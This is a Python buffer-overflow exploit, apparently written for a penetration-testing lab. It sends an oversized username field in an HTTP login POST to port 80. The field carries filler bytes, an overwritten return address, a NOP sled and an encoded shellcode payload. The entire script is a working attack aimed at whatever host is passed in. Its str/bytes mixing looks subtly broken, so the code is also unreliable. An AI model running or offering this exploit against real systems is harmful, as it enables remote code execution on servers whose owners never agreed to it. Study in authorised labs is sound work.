#!/usr/bin/python
import socket
import sys
try:
    server = sys.argv[1]
    port = 80
    size = 800
    filler = b"A" * 780
    eip = b"\x83\x0c\x09\x10" #10090c83 10090c83
    offset = b"C" * 4
    nops=b"\x90" * 10
    shellcode = bytearray(
"\xdd\xc3\xbb\x85\x6e\xbe\x43\xd9\x74\x24\xf4\x5e\x31\xc9"
"\xb1\x52\x31\x5e\x17\x03\x5e\x17\x83\x43\x6a\x5c\xb6\xb7"
"\x9b\x22\x39\x47\x5c\x43\xb3\xa2\x6d\x43\xa7\xa7\xde\x73"
"\xa3\xe5\xd2\xf8\xe1\x1d\x60\x8c\x2d\x12\xc1\x3b\x08\x1d"
"\xd2\x10\x68\x3c\x50\x6b\xbd\x9e\x69\xa4\xb0\xdf\xae\xd9"
"\x39\x8d\x67\x95\xec\x21\x03\xe3\x2c\xca\x5f\xe5\x34\x2f"
"\x17\x04\x14\xfe\x23\x5f\xb6\x01\xe7\xeb\xff\x19\xe4\xd6"
"\xb6\x92\xde\xad\x48\x72\x2f\x4d\xe6\xbb\x9f\xbc\xf6\xfc"
"\x18\x5f\x8d\xf4\x5a\xe2\x96\xc3\x21\x38\x12\xd7\x82\xcb"
"\x84\x33\x32\x1f\x52\xb0\x38\xd4\x10\x9e\x5c\xeb\xf5\x95"
"\x59\x60\xf8\x79\xe8\x32\xdf\x5d\xb0\xe1\x7e\xc4\x1c\x47"
"\x7e\x16\xff\x38\xda\x5d\x12\x2c\x57\x3c\x7b\x81\x5a\xbe"
"\x7b\x8d\xed\xcd\x49\x12\x46\x59\xe2\xdb\x40\x9e\x05\xf6"
"\x35\x30\xf8\xf9\x45\x19\x3f\xad\x15\x31\x96\xce\xfd\xc1"
"\x17\x1b\x51\x91\xb7\xf4\x12\x41\x78\xa5\xfa\x8b\x77\x9a"
"\x1b\xb4\x5d\xb3\xb6\x4f\x36\xb6\x43\x4a\xcc\xae\x49\x54"
"\xc1\x72\xc7\xb2\x8b\x9a\x81\x6d\x24\x02\x88\xe5\xd5\xcb"
"\x06\x80\xd6\x40\xa5\x75\x98\xa0\xc0\x65\x4d\x41\x9f\xd7"
"\xd8\x5e\x35\x7f\x86\xcd\xd2\x7f\xc1\xed\x4c\x28\x86\xc0"
"\x84\xbc\x3a\x7a\x3f\xa2\xc6\x1a\x78\x66\x1d\xdf\x87\x67"
"\xd0\x5b\xac\x77\x2c\x63\xe8\x23\xe0\x32\xa6\x9d\x46\xed"
"\x08\x77\x11\x42\xc3\x1f\xe4\xa8\xd4\x59\xe9\xe4\xa2\x85"
"\x58\x51\xf3\xba\x55\x35\xf3\xc3\x8b\xa5\xfc\x1e\x08\xd5"
"\xb6\x02\x39\x7e\x1f\xd7\x7b\xe3\xa0\x02\xbf\x1a\x23\xa6"
"\x40\xd9\x3b\xc3\x45\xa5\xfb\x38\x34\xb6\x69\x3e\xeb\xb7"
"\xbb"
    )
    shellcode+= "D" * (1500-len(filler) -len(eip) -len(offset) -len(shellcode))
    inputBuffer = filler + eip + offset + nops+ shellcode 
    content = b"username=" + inputBuffer + b"&password=A"
    buffer = b"POST /login HTTP/1.1\r\n"
    buffer += b"Host: " + server.encode() + b"\r\n"
    buffer += b"User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
    buffer += b"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
    buffer += b"Accept-Language: en-US,en;q=0.5\r\n"
    buffer += b"Referer: http://10.11.0.22/login\r\n"
    buffer += b"Connection: close\r\n"
    buffer += b"Content-Type: application/x-www-form-urlencoded\r\n"
    buffer += b"Content-Length: "+ str(len(content)).encode() + b"\r\n"
    buffer += b"\r\n"
    buffer += content
    print("Sending evil buffer...")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((server, port))
    s.send(buffer)
    s.close()
    print("Done!")
except socket.error:
    print("Could not connect!")
